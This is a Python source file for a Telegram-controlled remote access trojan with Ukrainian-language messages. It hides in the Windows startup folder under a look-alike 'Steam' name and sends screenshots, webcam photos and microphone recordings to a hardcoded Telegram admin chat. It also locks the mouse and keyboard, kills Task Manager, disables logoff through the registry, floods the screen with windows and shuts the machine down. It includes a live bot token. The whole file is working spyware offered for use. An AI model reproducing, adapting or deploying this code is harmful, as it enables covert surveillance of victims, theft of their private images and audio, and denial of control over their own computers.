import telebot
import pyautogui
import threading
import keyboard
import time
import wavio
import psutil
import cv2
import sounddevice as sd
import os
import winreg
import webbrowser   
import shutil
import tkinter as tk
def add_to_startup(exe_path=None):
    if exe_path is None:
        exe_path = os.path.abspath(__file__)

    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )
    shortcut_path = os.path.join(startup_folder, "Stеаm.exe")

    with open(shortcut_path, 'w') as file:
        file.write(f'start "" "{exe_path}"')
    return True
TOKEN = "8244420887:AAHlgobGLf3BHSfks0_G19EPVy9_89OLRNo"
bot = telebot.TeleBot(TOKEN)
ADMIN_CHAT_ID = 6311907823
if add_to_startup():
    bot.send_message(ADMIN_CHAT_ID, "Додано в автозапуск.")
bot.send_message(ADMIN_CHAT_ID, "✅ Бот запущений і працює!")
mouse_block = False
pyautogui.FAILSAFE = False
def lock_mouse_loop():
    global mouse_block
    screen_width, screen_height = pyautogui.size()
    center_x = screen_width // 2
    center_y = screen_height // 2

    while mouse_block:
        current_x, current_y = pyautogui.position()
        if current_x != center_x or current_y != center_y:
            pyautogui.moveTo(center_x, center_y)
        time.sleep(0.01)  
@bot.message_handler(commands=['block_mouse'])
def block_mouse(message):
    global mouse_block
    mouse_block = True
    bot.send_message(message.chat.id, "🖱️ Мишка повністю заблокована.")
    threading.Thread(target=lock_mouse_loop, daemon=True).start()
@bot.message_handler(commands=['unblock_mouse'])
def unblock_mouse(message):
    global mouse_block
    mouse_block = False
    bot.send_message(ADMIN_CHAT_ID, "✅ Мишку розблоковано.")
keyboard_block = False
def keyboard_block_loop():
    global keyboard_block
    while keyboard_block:
        for i in range(1, 152):
                if keyboard_block == False:
                    return
                else:
                    keyboard.block_key(i)
                    time.sleep(0.01)
@bot.message_handler(commands=['block_keyboard'])
def block_keyboard(message):        
    global keyboard_block
    keyboard_block = True
    bot.send_message(ADMIN_CHAT_ID, "⌨️ Клавіатура заблокована (в рамках Python).")
    threading.Thread(target=keyboard_block_loop, daemon=True).start()
@bot.message_handler(commands=['unblock_keyboard'])
def unblock_keyboard(message):
    global keyboard_block
    keyboard_block = False
    keyboard.unhook_all()
    bot.send_message(ADMIN_CHAT_ID, "✅ Клавіатура розблокована.")
@bot.message_handler(commands=['screenshot'])
def send_screenshot(message):
    try:
        screenshot = pyautogui.screenshot()
        filename = "screenshot.png"
        screenshot.save(filename)
        bot.send_photo(ADMIN_CHAT_ID, photo=open(filename, 'rb'))
        bot.send_message(ADMIN_CHAT_ID, "✅ Скриншот надіслано адміну.")
        os.remove(filename)
    except Exception as e:
        bot.send_message(ADMIN_CHAT_ID, f"❌ Сталася помилка: {e}")
@bot.message_handler(commands=['photo'])
def take_photo(message):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            bot.send_message(ADMIN_CHAT_ID, "❌ Не вдалося отримати знімок з вебкамери.")
            return
        filename = "photo.jpg"
        cv2.imwrite(filename, frame)
        with open(filename, 'rb') as photo:
            bot.send_photo(ADMIN_CHAT_ID, photo)
        bot.send_message(ADMIN_CHAT_ID, "✅ Фото зроблено та надіслано адміну.")
        os.remove(filename)
    except Exception as e:
        bot.send_message(ADMIN_CHAT_ID, f"❌ Сталася помилка: {e}")
recording = False
frames = []
samplerate = 44100  
channels = 1
def record_audio():
    global frames, recording
    frames = []
    def callback(indata, frame_count, time_info, status):
        if recording:
            frames.append(indata.copy())
    with sd.InputStream(samplerate=samplerate, channels=channels, callback=callback):
        while recording:
            sd.sleep(100)
@bot.message_handler(commands=['start_record'])
def start_record(message):
    global recording
    if recording:
        bot.send_message(message.chat.id, "⚠️ Вже записую...")
        return
    recording = True
    threading.Thread(target=record_audio, daemon=True).start()
    bot.send_message(message.chat.id, "🎤 Почав запис голосу...")
@bot.message_handler(commands=['stop_record'])
def stop_record(message):
    global recording, frames
    if not recording:
        bot.send_message(ADMIN_CHAT_ID, "⚠️ Запис не був запущений.")
        return
    recording = False
    filename = "voice_record.wav"
    import numpy as np
    audio_data = np.concatenate(frames, axis=0)
    wavio.write(filename, audio_data, samplerate, sampwidth=2)
    with open(filename, 'rb') as f:
        bot.send_audio(ADMIN_CHAT_ID, f)
    bot.send_message(ADMIN_CHAT_ID, "✅ Голос надіслано адміну.")
    os.remove(filename)
@bot.message_handler(commands=['altf4'])
def send_alt_f4(message):
    bot.send_message(ADMIN_CHAT_ID, "🔻 Виконую ALT + F4")
    keyboard.send('alt+f4')
@bot.message_handler(commands=['open'])
def open_website(message):
    try:
        url = message.text.split(maxsplit=1)[1]
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "https://" + url
        import webbrowser
        webbrowser.open(url)
        bot.reply_to(message, f"Відкриваю сайт: {url}")
    except IndexError:
        bot.reply_to(message, "❗ Вкажи сайт після команди. Приклад:\n/open google.com")
    except Exception as e:
        bot.reply_to(message, f"⚠ Помилка: {e}")
def kill_process_by_name(name):
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == name.lower():
            try:
                proc.kill()
                return f"Процес {name} завершено."
            except Exception as e:
                return f"Не вдалося завершити {name}: {e}"
    return f"Процес {name} не знайдено."
@bot.message_handler(commands=['close'])
def close_process(message):
    try:
        process_name = message.text.split()[1]
        result = kill_process_by_name(process_name)
    except IndexError:
        result = "Будь ласка, вкажи ім'я процесу після команди. Наприклад: /close notepad.exe"
    bot.reply_to(message, result)
stop_taskmgr_check = False
def close_taskmgr_loop():
    global stop_taskmgr_check
    while not stop_taskmgr_check:
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if proc.info['name'] and "taskmgr.exe" in proc.info['name'].lower():
                    proc.terminate()
                    proc.wait(timeout=5)
                    print("✅ Task Manager закрито")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        time.sleep(2)
@bot.message_handler(commands=['block_taskmgr'])
def block_taskmgr(message):
    global stop_taskmgr_check   
    stop_taskmgr_check = False
    threading.Thread(target=close_taskmgr_loop, daemon=True).start()
    bot.send_message(ADMIN_CHAT_ID, "🛡️ Task Manager блокування активне")
@bot.message_handler(commands=['unblock_taskmgr'])
def unblock_taskmgr(message):
    global stop_taskmgr_check
    stop_taskmgr_check = True
    bot.send_message(ADMIN_CHAT_ID, "✅ Task Manager блокування зупинено")
def disable_logoff():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
    winreg.SetValueEx(key, "NoLogoff", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)
def enable_logoff():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
    winreg.SetValueEx(key, "NoLogoff", 0, winreg.REG_DWORD, 0)
    winreg.CloseKey(key)
@bot.message_handler(commands=['disable_logoff'])
def cmd_disable(message):
    try:
        disable_logoff()
        bot.send_message(ADMIN_CHAT_ID, "🔴 Вихід у Ctrl+Alt+Del ВИМКНЕНО!\nПерезапусти Explorer або ПК.")
    except Exception as e:
        bot.send_message(ADMIN_CHAT_ID, f"❌ Помилка: {e}")
@bot.message_handler(commands=['enable_logoff'])
def cmd_enable(message):
    try:
        enable_logoff()
        bot.send_message(ADMIN_CHAT_ID, "🟢 Вихід у Ctrl+Alt+Del УВІМКНЕНО!\nПерезапусти Explorer або ПК.")
    except Exception as e:
        bot.send_message(ADMIN_CHAT_ID, f"❌ Помилка: {e}")
@bot.message_handler(commands=['windows'])
def my_function(message):
    root = tk.Tk()
    root.withdraw()
    windows = []
    for i in range(1000):
        win = tk.Toplevel(root)
        win.title("!!!")
        win.geometry("1920x1080")
        win.attributes("-disabled", True)
        windows.append(win)
    def enable_windows():
        for w in windows:
            try:
                w.attributes("-disabled", False)
            except:
                pass
    root.after(5000, enable_windows)
    bot.send_message(ADMIN_CHAT_ID, "Вікна створені! Через 5 секунд ними можна буде користуватися.")
    root.mainloop()
@bot.message_handler(commands=['shutdown'])
def shutdown_pc(message):
    bot.reply_to(message, "⚠️ Комп'ютер буде вимкнено через 20 секунд!")
    os.system("shutdown /s /t 20")
bot.polling()